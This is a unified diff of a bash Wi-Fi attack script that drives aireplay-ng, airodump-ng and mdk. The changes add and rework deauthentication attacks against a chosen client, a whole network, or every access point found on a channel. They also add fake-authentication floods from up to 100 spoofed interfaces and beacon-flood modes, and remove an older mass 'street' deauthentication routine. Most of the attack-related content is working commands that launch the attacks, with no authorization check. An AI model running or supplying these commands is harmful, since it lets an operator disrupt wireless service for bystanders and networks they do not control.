@@ -126,8 +126,10 @@ done
                                                          echo "BYEEE >:)"  
                                                             exit
                                                                   else
-                                                                    sleep 1
-                                                                    restartprogram
+                                                                  echo
+                                                                  echo wrong option dude :v
+                                                                    sleep 2
+                                                                    Menuoption
                                                                         fi
                                                                                 }
 
@@ -137,8 +139,9 @@ DeauthAttacks(){
         
             echo    $purple"{"$cyan"1"$purple"}"$yellow"--"$green"Client Deauth (Quicks a client that you want from a network)"
              echo    $purple"{"$cyan"2"$purple"}"$yellow"--"$green"Network Deauth (Quicks out by broadcast clients from one network)"
-              echo    $purple"{"$cyan"3"$purple"}"$yellow"--"$green"Broadcast street Deauth (.______.)"
-              echo      $purple"{"$cyan"4"$purple"}"$yellow"--"$green"Back to menu"
+              echo    $purple"{"$cyan"3"$purple"}"$yellow"--"$green"Broadcast Range channel Deauth"
+              echo    $purple"{"$cyan"4"$purple"}"$yellow"--"$green"Street Deauth in all channels 2.4GHz by broadcast (.______.)"
+              echo      $purple"{"$cyan"5"$purple"}"$yellow"--"$green"Back to menu"
                 echo
 
 
@@ -156,11 +159,25 @@ DeauthAttacks(){
 
                                                 elif [ $deauth -eq 3 ];
                                                         then
-                                                                StreetDeauth
+                                                                RangeDeauth
 
                                                         elif [ $deauth -eq 4 ];
                                                         then
-                                                        Menuoption
+
+                                                                StreetDeauth
+
+                                                                elif [ $deauth -eq 5 ];
+                                                                then
+                                                                Menuoption
+                                                                else 
+                                                                echo
+                                                                echo "BURRRRRRRR that option doesn't exist lmao :v"
+                                                                sleep 2
+                                                                echo
+                                                                echo put again the option :D
+                                                                echo
+                                                                DeauthAttacks
+                                                        
                         
 fi
 }
@@ -172,7 +189,24 @@ ClientDeauth(){
    InterMsg
         echo 
          echo 
-          MonitorAttack1        
+          MonitorMode
+echo  "[${Green}${wifiInterfaceMon}${White}] Write the client MAC..." &
+        if sudo $Tool -e nano &
+           echo  "[${Green}${wifiInterfaceMon}${White}] Showing clients..."
+        then sudo $Tool -e $AirDumper --bssid $bssid --channel $channel  $wifiInterfaceMon 
+                echo
+                read -p " Paste the target client bssid: " mac
+                echo "[+] client catched"
+                sleep 3
+                InterMsg2
+                        if sudo $Tool -fg red  -e $AirAttack -0 1000000 -a $bssid -c $mac $wifiInterfaceMon
+                        then InterMsg3
+                        else echo "You dont have installed xterm requeriments install with sudo apt install xterm"
+                          echo "The attack has not been executed restarting tool..."
+                                Menuoption
+                        fi
+                         fi
+                            
 }
 
  #### Network Deauth ####
@@ -183,26 +217,80 @@ NetworkDeauth(){
       InterMsg
             echo 
               echo
-               MonitorAttack2
+               MonitorMode
+echo "\n${red}┌─[${red}Select channel for Target${red}]──[${red}~${red}]─[${red}Network${red}]:"
+read -p "└─────►$(tput setaf 7) " channel
+$AirDumper --bssid $bssid --channel $channel $wifiInterfaceMon > /dev/null & sleep 15 ; kill $!  
+echo  "[${Green}${targetName}${White}] DoS started, all devices disconnected... "
+sleep 0.5
+echo  "[${Green}DoS${White}] Press ctrl+c to stop attack & exit..."
+if sudo $Tool -fg red -e $AirAttack -0 100000 -a $bssid $wifiInterfaceMon 
+then InterMsg3
+else 
+echo
+echo "You dont have installed xterm requeriments install with sudo apt install xterm"
+echo
+echo
+fi
 
 }
 
- #### Street Deauth ####
+ #### Range Deauth ####
+
+
+RangeDeauth(){
+
+echo "\n${red}┌─[${red}Select range channel for Targets${red}]──[${red}~${red}]─[${red}Network${red}]:"
+read -p "└─────►$(tput setaf 7) " channel
+            echo 
+            echo "scanning networks in channel $channel..."       
+            echo 
+                sudo timeout 25s $Tool -e $AirDumper -c $channel --output-format kismet --write generated $wifiInterfaceMon
+echo ""
+                echo showing networks available in channel $channel...
+echo ""
+
+ sed -i '1d' generated-01.kismet.csv
+
+echo  "\n\n${Red}SerialNo        WiFi Channel${White}        WiFi Network${White}"
+echo "---------------------------------------------------------------------------------------"
+awk -F';' '{print "     " $6 "               " $3}' generated-01.kismet.csv  | nl -n ln -w 8
+
+echo ""
+echo "sending AP MAC addresses in channel $channel to export file..."
+sleep 3
+awk -F';' '{print "     " $4 }' generated-01.kismet.csv >> APs.txt
+sed -i '/BSSID/d' APs.txt
+echo ""
+echo "showing MACs..."
+echo ""
+cat APs.txt
+echo ""
+echo "Starting Deauth attack by broadcast in all networks from channel $channel"
+
+sudo timeout 1000s $Tool -e $AirDumper -c $channel $wifiInterfaceMon &
+
+file="APs.txt"
+
+if [ -f "$file" ]; then
+        while IFS= read -r target; do
+sudo $Tool -e "$AirAttack -0 99999 -a $target $wifiInterfaceMon" &
+done < "$file"
+
+else 
+   echo "the file $file doesn't exist"
+
+fi
+}
+
 
 
 StreetDeauth(){
-        
-        InterMsg
-            echo 
-            echo 
-             MonitorMode2
-             maker
-             showingstreet 
-             varStreets 
-             MonitorAttack3
-        
 
+sudo ./maker.sh
+sudo ./attack.sh
 }
+
 
 #### Messages ####
 
@@ -228,29 +316,37 @@ echo "$purple"Attack "$green"COMLETED to 100% "$purple"finishing tool tasks"$pur
 
 AuthDoSAttacks(){
 
-        echo $purple"{"$cyan"1"$purple"}"$yellow"--"$green"AP Auth (Quicks a client that you want from a network)"
-        echo $purple"{"$cyan"2"$purple"}"$yellow"--"$green"AP Auth in range (Quicks out by broadcast clients from one network)"
-        echo $purple"{"$cyan"3"$purple"}"$yellow"--"$green"AP Auth for all (.______.)"
-        echo $purple"{"$cyan"4"$purple"}"$yellow"--"$green"Back to menu"
+        echo $purple"{"$cyan"1"$purple"}"$yellow"--"$green"Fake Auth AP"
+        echo $purple"{"$cyan"2"$purple"}"$yellow"--"$green"AP Auth (Auth with multiple fake MACs for a exclusive AP)"
+        echo $purple"{"$cyan"3"$purple"}"$yellow"--"$green"AP Auth in range (The same than option 2 but in all AP's frpm one channel o multiple channel)"
+        echo $purple"{"$cyan"4"$purple"}"$yellow"--"$green"AP Auth for all (The same than option 2 but for all AP's that finds youre wireless NIC in monitor mode)"
+        echo $purple"{"$cyan"5"$purple"}"$yellow"--"$green"Craft Virtual interfaces for attack..."
+        echo $purple"{"$cyan"6"$purple"}"$yellow"--"$green"Back to menu"
         echo
                         
                                            
                         echo $purple "╭─"$green"Select Attack mode (-_-) "$purple
                            read -p " ╰─$ " auth
-  
+                           echo
+
                                 if [ $auth -eq 1 ];
+                                        then
+                                                FakeAuthAP
+  
+                                elif [ $auth -eq 2 ];
                                         then
                                                 DoSAuthAP
 
-                                        elif [ $auth -eq 2 ];
+                                        elif [ $auth -eq 3 ];
                                                 then
                                                         DoSRangeAuthAP
 
-                                                elif [ $auth -eq 3 ];
+                                                elif [ $auth -eq 4 ];
                                                         then
                                                         DoSAllAuthAP
 
-                                                elif [ $auth -eq 4 ];
+
+                                                elif [ $auth -eq 5 ];
                                                         then
 
                                                         Menuoption
@@ -261,7 +357,76 @@ AuthDoSAttacks(){
 fi
 }
 
+FakeAuthAP(){
+fakeMAC=E6:EF:59:81:6A:DD
+MonitorMode2
+echo
+echo $purple "╭─"$green"Enter MAC address target (-_-) "$purple
+                           read -p " ╰─$ " AP
+
+echo $purple "╭─"$green"Enter Network channel (-_-) "$purple
+                           read -p " ╰─$ " chann
+
+echo starting fake Auth attack...
+
+sudo $Tool -e $AirDumper --bssid $AP -c $chann wlo1mon &
+sudo $Tool -e $AirAttack -1 0 -a  $AP -h $fakeMAC $wifiInterfaceMon &
+sudo $Tool -e $AirDumper --bssid $AP $wifiInterfaceMon
+
+}
+
+
+
+DoSAuthAP(){
+numINT=100
+MonitorMode2
+echo
+echo $purple "╭─"$green"Enter MAC address target (-_-) "$purple
+                           read -p " ╰─$ " AP
+
+echo $purple "╭─"$green"Enter Network channel (-_-) "$purple
+                           read -p " ╰─$ " chann
+
+echo starting DoS fake AuthAP...
+
+sudo $Tool -e $AirDumper --bssid $AP -c $chann $wifiInterfaceMon &
+
+for i in $(seq $numINT); do
+
+current_interface="mon$i"
+current_mac="$(ip link show $current_interface | awk '/link/ {print $2}')"
+
+echo "Current interface: $current_interface"
+echo "Current mac: $current_mac"
+
+sudo $Tool -e $AirAttack -1 0 -a "$AP" -h "$current_mac" "$current_interface" & sleep 2 > /dev/null
+
+done
+
+sudo $Tool -e $AirDumper --bssid $AP $wifiInterfaceMon                           
+}
+
+DoSRangeAuthAP(){
+
+echo $purple "╭─"$green"Select Attack mode (-_-) "$purple
+                           read -p " ╰─$ " auth
+
+}
+
+DoSAllAuthAP(){
+
+echo in develop
+}
+
 RogueAPsAttacks(){
+
+        echo $purple"{"$cyan"1"$purple"}"$yellow"--"$green"RogueAP to 1 network"
+        echo $purple"{"$cyan"2"$purple"}"$yellow"--"$green"RogueAP to range channel (all 2.4GHz networks in one channel)"
+        echo $purple"{"$cyan"3"$purple"}"$yellow"--"$green"RogueAP for all (makes a reply of all near APs in all 2.4GHz band)"
+        echo $purple"{"$cyan"4"$purple"}"$yellow"--"$green"Back to menu"
+        echo
+                        
+                                           
         echo $purple "╭─"$green"Select Attack mode (-_-) "$purple
                            read -p " ╰─$ " auth
   
@@ -281,33 +446,29 @@ RogueAPsAttacks(){
                                                         then
 
                                                         Menuoption
+
+                                                        else
+                                                        echo ""
+                                                        echo "ah ah ah thats not correct :)"
+                                                        echo ""
+                                                        RogueAPsAttacks
                         
 fi
 }
 
-#### Beacon flood monitor mode #### 
-
-MonitorMode3(){
-       $Tool -e $AirMonitor start $Interface >> /dev/null & $Tool -e $AirDumper $wifiInterfaceMon
+Rogue1AP(){
+        echo "in develop..."
 }
 
-#### Monitor mode 3 options ####
-
-Yes(){
-echo ""
-echo "You take the Yes option starting sniffing services"        
-sleep 2
-MonitorMode3
+RangeRogueAP(){
+        echo "in develop..."
 }
 
-No(){
-echo ""
-$AirMonitor start $Interface >> /dev/null
-echo "You take the No option starting Beacon flooding menu"        
-sleep 2
-
-
+AllRogueAP(){
+        echo "in develop..."
 }
+
+
 
 #### Realtime attack sniffing packets####
 
@@ -315,103 +476,79 @@ Realtimer(){
 $Tool -fg green -e $sniffer -i $wifiInterfaceMon 
 }
 
-#### Monitor mode 3 actions ####
-
-WifiSpy_Choose(){
- 
- if [ $get -eq 1 ];
-then
-Yes
-
-
-
-elif [ $get -eq 2 ];
-then 
-No
-
-
- 
- fi
-
-}
-
-option(){
-echo "You want to see the avalaible network channels in youre area ???"
-read -p " Press 1 for Yes  2 for No $ " get
-WifiSpy_Choose
-}
-
-
-#### Personalitzed and default beacon flood attack options ####
-
-yes(){
-
- bash ./beaconPers.sh
-
-        if echo "starting personalized beacon flood attack"
-        then 
-        echo "starting stream attack"
-        Realtimer &
-        sleep 1 & 
-        $Tool -e $MDK $wifiInterfaceMon b -f names -s 9000000000000000000
-fi
-}
-
-
-no(){
-      echo ""
-      if echo "starting stream attack"
-         echo ""
-  then   echo "starting default attack"
-        Realtimer &
-        sudo $Tool -e $MDK $wifiInterfaceMon b -s 9000000000000000000
- fi
-  
-}
-
-Choose(){
-echo
-echo "You want to do a personalized attack ???" 
-read -p " Press 1 for Yes  2 for No $ " get
-Election
-
-}
 
 #### Beacon flood attack options ####
 
 Election(){
+echo
+echo "You want to do a personalized attack ???" 
+read -p " Press 1 for Yes  2 for No $ " get
+
  if [ $get -eq 1 ];
 then
-yes
+bash ./beaconPers.sh
 
-InterMsg3
+        echo "starting personalized beacon flood attack"
+        echo "starting stream attack"
+        Realtimer &
+        sleep 1 & 
+        $Tool -e $MDK $wifiInterfaceMon b -f names -s 9000000000000000000
+
+
 
 elif [ $get -eq 2 ];
 then
-no
+echo ""
+         echo "starting stream attack"
+         echo ""
+         echo "starting default attack"
+        Realtimer &
+        sudo $Tool -e $MDK $wifiInterfaceMon b -s 9000000000000000000
+        InterMsg3
 
-InterMsg3        
- 
- fi
-
+else 
+echo ""
+echo "Incorrect..." && sleep 2 &&
+echo try again dude...
+Election
+echo ""
+fi
 }
 
 
 #### Beacon flooding option menu ####
 
 BeaconFlood(){
+echo
+echo "You want to see the avalaible network channels in youre area ???"
+read -p " Press 1 for Yes  2 for No $ " get
+
+ if [ $get -eq 1 ];
+then
+sudo $AirDumper $wifiInterfaceMon &&
+clear &&
+BeaconFlood
+
+elif [ $get -eq 2 ];
+then
+echo
 echo ""
 echo "starting the 'joke mode'"
 sleep 2 
 echo ""
-        option
-
 
         echo "What channel of 1-13 you want to attack ??? ("For attack all channels leave in blank and enter...")"
         echo ""
      
        read -p "└─────►$(tput setaf 7) " ch
-Choose
+Election
+
+else 
+echo ""
+echo "AAAAAA my eyes put glasses lmfao..."
+echo ""
+BeaconFlood
+fi
 }
 
 
@@ -466,6 +603,13 @@ RestartFunctions(){
                                                 sudo systemctl stop NetworkManager
                                                 sudo systemctl stop avahi-daemon.socket 
                                                         sudo systemctl stop avahi-daemon
+
+
+                                                        else
+                                                        echo ""
+                                                        echo "Put a avalaible options please... :("
+                                                        echo ""
+                                                        RestartFunctions
 
                                         fi
                                         }
@@ -531,14 +675,51 @@ fi
 fi
 }
 
+ 
+
+#### Fake Auth Attack monitor mode #### 
 
 MonitorMode2(){      
-$AirMonitor start $Interface >> /dev/null
-echo starting monitor mode with $Interface
-sleep 2
-echo Scanning Networks...
-echo ""
-} #!/bin/bash
+       if $AirMonitor start $Interface >> /dev/null
+        then echo starting monitor mode with $Interface
+        sleep 2
+        echo Scanning Networks...
+                trap "airmon-ng stop $wifiInterfaceMon > /dev/null;rm generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
+                airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & sleep 15 ; kill $!
+                echo showing networks available...
+                        sed -i '1d' generated-01.kismet.csv
+                        echo  "\n\n${Red}SerialNo        WiFi Channel${White}        WiFi Network${White}                               MAC Address${White}"
+                        echo "---------------------------------------------------------------------------------------------------------------"
+                        awk -F';' '{print "     " $6 "               " $3 "               "$4}' generated-01.kismet.csv  | nl -n ln -w 8
+                                
+
+                                                else
+
+echo checking if interface its in monitor mode...
+if xterm -e sudo airodump-ng $Interface == true
+then 
+echo the interface its in monitor mode Scanning Networks...
+                trap "airmon-ng stop $wifiInterfaceMon > /dev/null;rm generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
+                airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & sleep 15 ; kill $!
+                echo showing networks available...
+                        sed -i '1d' generated-01.kismet.csv
+                        echo  "\n\n${Red}SerialNo     WiFi Channel${White}        WiFi Network${White}                              MAC Address${White}"
+                        echo "----------------------------------------------------------------------------------------------------------------------------"
+                        awk -F';' '{print "   " $6 "           "$3"                              "      " " """"""""""""""""""""$4}' generated-01.kismet.csv  | nl -n ln -w 8
+                                
+
+                                                 rm generated-01.kismet.csv 2> /dev/null
+
+
+  echo
+  else
+  echo "The tool dont start restart the software or the NIC and try again" 
+   echo
+    echo
+    exit
+fi
+fi
+}
 
 #### Files maker ####
 
@@ -546,270 +727,10 @@ maker(){
 sudo ./maker.sh
 }
 
+
+
+
 #### Monitor attacks ####
-
-MonitorAttack1(){
-MonitorMode
-echo  "[${Green}${wifiInterfaceMon}${White}] Write the client MAC..." &
-        if sudo $Tool -e nano &
-           echo  "[${Green}${wifiInterfaceMon}${White}] Showing clients..."
-        then sudo $Tool -e $AirDumper --bssid $bssid --channel $channel  $wifiInterfaceMon 
-                echo
-                read -p " Paste the target client bssid: " mac
-                echo "[+] client catched"
-                sleep 3
-                InterMsg2
-                        if sudo $Tool -fg red  -e $AirAttack -0 1000000 -a $bssid -c $mac $wifiInterfaceMon
-                        then InterMsg3
-                        else echo "You dont have installed xterm requeriments install with sudo apt install xterm"
-                          echo "The attack has not been executed restarting tool..."
-                                Menuoption
-                        fi
-                         fi
-                                        }
-
-MonitorAttack2(){
-MonitorMode
-echo "\n${red}┌─[${red}Select channel for Target${red}]──[${red}~${red}]─[${red}Network${red}]:"
-read -p "└─────►$(tput setaf 7) " channel
-$AirDumper --bssid $bssid --channel $channel $wifiInterfaceMon > /dev/null & sleep 15 ; kill $!  
-echo  "[${Green}${targetName}${White}] DoS started, all devices disconnected... "
-sleep 0.5
-echo  "[${Green}DoS${White}] Press ctrl+c to stop attack & exit..."
-if sudo $Tool -fg red -e $AirAttack -0 100000 -a $bssid $wifiInterfaceMon 
-then InterMsg3
-else 
-echo
-echo "You dont have installed xterm requeriments install with sudo apt install xterm"
-echo
-echo
-fi
-}
-
-
-showingstreet(){
-echo Note this its the show of just one capture file but you have to assume that all files have detected the near networks in the procces of creation of this lasts...
-echo showing networks available...
- 
- sed -i '1d' generated-01.kismet.csv
-
-echo  "\n\n${Red}SerialNo        WiFi Channel${White}        WiFi Network${White}"
-echo "---------------------------------------------------------------------------------------"
-awk -F';' '{print "     " $6 "               " $3}' generated-01.kismet.csv  | nl -n ln -w 8
-
-}
-
-
-#### Variables list + inputs ####
-
-varStreets(){
-targetNumber=1000
-targetNumber2=1000
-targetNumber3=1000
-targetNumber4=1000
-  targetNumber5=1000
-    targetNumber6=1000
-        targetNumber7=1000
-         targetNumber8=1000
-            targetNumber9=1000
-              targetNumber10=1000
-                targetNumber11=1000
-                  targetNumber12=1000
-                    targetNumber13=1000
-                      targetNumber14=1000
-                         targetNumber15=1000
-
-
-#### Target select ####
-
-while [ ${targetNumber} -gt `wc -l generated-01.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber} -lt 1 ]; do 
-echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-read -p "└─────►$(tput setaf 7) " targetNumber 
-done
-
-targetName=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 3 `
-bssid=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 4 `
-channel=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 6 `
-
-
-
-        while [ ${targetNumber2} -gt `wc -l generated-02.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber2} -lt 1 ]; do 
-        echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-        read -p "└─────►$(tput setaf 7) " targetNumber2
-        done 
-
-        targetName2=`sed -n "${targetNumber2}p" < generated-02.kismet.csv | cut -d ";" -f 3 `
-        bssid2=`sed -n "${targetNumber2}p" < generated-02.kismet.csv | cut -d ";" -f 4 `
-        channel2=`sed -n "${targetNumber2}p" < generated-02.kismet.csv | cut -d ";" -f 6 `
-
-
-
-                while [ ${targetNumber3} -gt `wc -l generated-03.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber3} -lt 1 ]; do 
-                echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-                read -p "└─────►$(tput setaf 7) " targetNumber3 
-                done
-
-                targetName3=`sed -n "${targetNumber3}p" < generated-03.kismet.csv | cut -d ";" -f 3 `
-                bssid3=`sed -n "${targetNumber3}p" < generated-03.kismet.csv | cut -d ";" -f 4 `
-                channel3=`sed -n "${targetNumber3}p" < generated-03.kismet.csv | cut -d ";" -f 6 `
-
-
-
-                        while [ ${targetNumber4} -gt `wc -l generated-04.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber4} -lt 1 ]; do 
-                        echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-                        read -p "└─────►$(tput setaf 7) " targetNumber4 
-                        done
-
-                        targetName4=`sed -n "${targetNumber4}p" < generated-04.kismet.csv | cut -d ";" -f 3 `
-                        bssid4=`sed -n "${targetNumber4}p" < generated-04.kismet.csv | cut -d ";" -f 4 `
-                        channel4=`sed -n "${targetNumber4}p" < generated-04.kismet.csv | cut -d ";" -f 6 `
-
-
-
-                                while [ ${targetNumber5} -gt `wc -l generated-05.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber5} -lt 1 ]; do 
-                                echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-                                read -p "└─────►$(tput setaf 7) " targetNumber5
-                                done
-
-                                targetName5=`sed -n "${targetNumber5}p" < generated-05.kismet.csv | cut -d ";" -f 3 `
-                                bssid5=`sed -n "${targetNumber5}p" < generated-05.kismet.csv | cut -d ";" -f 4 `
-                                channel5=`sed -n "${targetNumber5}p" < generated-05.kismet.csv | cut -d ";" -f 6 `
-
-
-
-                        while [ ${targetNumber6} -gt `wc -l generated-06.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber6} -lt 1 ]; do 
-                        echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-                        read -p "└─────►$(tput setaf 7) " targetNumber6 
-                        done
-
-                        targetName6=`sed -n "${targetNumber6}p" < generated-06.kismet.csv | cut -d ";" -f 3 `
-                        bssid6=`sed -n "${targetNumber6}p" < generated-06.kismet.csv | cut -d ";" -f 4 `
-                        channel6=`sed -n "${targetNumber6}p" < generated-06.kismet.csv | cut -d ";" -f 6 `
-
-
-
-                while
-                [ ${targetNumber7} -gt `wc -l generated-07.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber7} -lt 1 ]; do 
-                echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-                read -p "└─────►$(tput setaf 7) " targetNumber7
-                done 
-
-                targetName7=`sed -n "${targetNumber7}p" < generated-07.kismet.csv | cut -d ";" -f 3 `
-                bssid7=`sed -n "${targetNumber7}p" < generated-07.kismet.csv | cut -d ";" -f 4 `
-                channel7=`sed -n "${targetNumber7}p" < generated-07.kismet.csv | cut -d ";" -f 6 `
-
-
-
-        while [ ${targetNumber8} -gt `wc -l generated-08.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber8} -lt 1 ]; do 
-        echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-        read -p "└─────►$(tput setaf 7) " targetNumber8
-        done
-
-        targetName8=`sed -n "${targetNumber8}p" < generated-08.kismet.csv | cut -d ";" -f 3 `
-        bssid8=`sed -n "${targetNumber8}p" < generated-08.kismet.csv | cut -d ";" -f 4 `
-        channel8=`sed -n "${targetNumber8}p" < generated-08.kismet.csv | cut -d ";" -f 6 `
-
-
-
-                while [ ${targetNumber9} -gt `wc -l generated-09.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber9} -lt 1 ]; do 
-                        echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-                        read -p "└─────►$(tput setaf 7) " targetNumber9
-                        done
-
-                        targetName9=`sed -n "${targetNumber9}p" < generated-09.kismet.csv | cut -d ";" -f 3 `
-                        bssid9=`sed -n "${targetNumber9}p" < generated-09.kismet.csv | cut -d ";" -f 4 `
-                        channel9=`sed -n "${targetNumber9}p" < generated-09.kismet.csv | cut -d ";" -f 6 `
-
-
-
-                                while [ ${targetNumber10} -gt `wc -l generated-10.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber10} -lt 1 ]; do 
-                                echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-                                read -p "└─────►$(tput setaf 7) " targetNumber10 
-                                done
-
-                                targetName10=`sed -n "${targetNumber10}p" < generated-10.kismet.csv | cut -d ";" -f 3 `
-                                bssid10=`sed -n "${targetNumber10}p" < generated-10.kismet.csv | cut -d ";" -f 4 `
-                                channel10=`sed -n "${targetNumber10}p" < generated-10.kismet.csv | cut -d ";" -f 6 `
-
-
-
-        while [ ${targetNumber11} -gt `wc -l generated-11.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber11} -lt 1 ]; do 
-        echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-        read -p "└─────►$(tput setaf 7) " targetNumber11
-       done
-        targetName11=`sed -n "${targetNumber11}p" < generated-11.kismet.csv | cut -d ";" -f 3 `
-        bssid11=`sed -n "${targetNumber11}p" < generated-11.kismet.csv | cut -d ";" -f 4 `
-        channel11=`sed -n "${targetNumber11}p" < generated-11.kismet.csv | cut -d ";" -f 6 `
-
-                        while [ ${targetNumber12} -gt `wc -l generated-12.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber12} -lt 1 ]; do 
-                        echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-                        read -p "└─────►$(tput setaf 7) " targetNumber12 
-                        done 
-
-                        targetName12=`sed -n "${targetNumber12}p" < generated-12.kismet.csv | cut -d ";" -f 3 `
-                        bssid12=`sed -n "${targetNumber12}p" < generated-12.kismet.csv | cut -d ";" -f 4 `
-                        channel12=`sed -n "${targetNumber12}p" < generated-12.kismet.csv | cut -d ";" -f 6 `
-
-
-
-                                while [ ${targetNumber13} -gt `wc -l generated-13.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber13} -lt 1 ]; do 
-                                echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-                                read -p "└─────►$(tput setaf 7) " targetNumber13
-                                done
-
-                                targetName13=`sed -n "${targetNumber13}p" < generated-13.kismet.csv | cut -d ";" -f 3 `
-                                bssid13=`sed -n "${targetNumber13}p" < generated-13.kismet.csv | cut -d ";" -f 4 `
-                                channel13=`sed -n "${targetNumber13}p" < generated-13.kismet.csv | cut -d ";" -f 6 `
-
-
-
-                                        while [ ${targetNumber14} -gt `wc -l generated-14.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber14} -lt 1 ]; do 
-                                        echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-                                        read -p "└─────►$(tput setaf 7) " targetNumber14
-                                        done
-
-                                        targetName14=`sed -n "${targetNumber14}p" < generated-14.kismet.csv | cut -d ";" -f 3 `
-                                        bssid14=`sed -n "${targetNumber14}p" < generated-14.kismet.csv | cut -d ";" -f 4 `
-                                        channel14=`sed -n "${targetNumber14}p" < generated-14.kismet.csv | cut -d ";" -f 6 `
-
-
-
-       while [ ${targetNumber15} -gt `wc -l generated-15.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber15} -lt 1 ]; do 
-       echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-       read -p "└─────►$(tput setaf 7) " targetNumber15
-                done
-
-        targetName15=`sed -n "${targetNumber15}p" < generated-15.kismet.csv | cut -d ";" -f 3 `
-        bssid15=`sed -n "${targetNumber15}p" < generated-15.kismet.csv | cut -d ";" -f 4 `
-       channel15=`sed -n "${targetNumber15}p" < generated-15.kismet.csv | cut -d ";" -f 6 `
-
-clear
-
-
-
-echo  "Preparing for attack..."
-sleep 3
-
-MonitorAttack3
-
-}
-
-
-MonitorAttack3(){
-
-
-sudo $Tool -e $AirAttack -0 1000000 -a $bssid1 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid2 $wifiInterfaceMon >> /dev/null &
-sudo $Tool -e $AirAttack -0 1000000 -a $bssid3 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid4 $wifiInterfaceMon >> /dev/null &
-sudo $Tool -e $AirAttack -0 1000000 -a $bssid5 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid6 $wifiInterfaceMon >> /dev/null &
-sudo $Tool -e $AirAttack -0 1000000 -a $bssid7 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid8 $wifiInterfaceMon >> /dev/null &
-sudo $Tool -e $AirAttack -0 1000000 -a $bssid9 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid10  $wifiInterfaceMon >> /dev/null &
-sudo $Tool -e $AirAttack -0 1000000 -a $bssid11 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid12  $wifiInterfaceMon >> /dev/null &
-sudo $Tool -e $AirAttack -0 1000000 -a $bssid13 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid14  $wifiInterfaceMon >> /dev/null &  
-sudo $Tool -e $AirAttack -0 1000000 -a $bssid15 $wifiInterfaceMon >> /dev/null 
-
-
-}
-
 
 
 MACspooferMonitorMode(){
@@ -837,7 +758,7 @@ sudo rm -rf *csv
 MACaddressTracking(){
 
         echo
-        sudo timeout 25s xterm -e $AirDumper --output-format kismet --write generated $wifiInterfaceMon
+        sudo timeout 25s $Tool -e $AirDumper --output-format kismet --write generated $wifiInterfaceMon
 echo ""
 echo "sending scanner dumped info to >> AP's.txt"
 sleep 3
@@ -911,9 +832,6 @@ sleep 3
 }
 
 
-
-
-
 interfaceconfcheck(){
 
 iwconfig
@@ -934,4 +852,3 @@ Banner
 Menuoption
 }     
 FuncioRecon                                                  
-
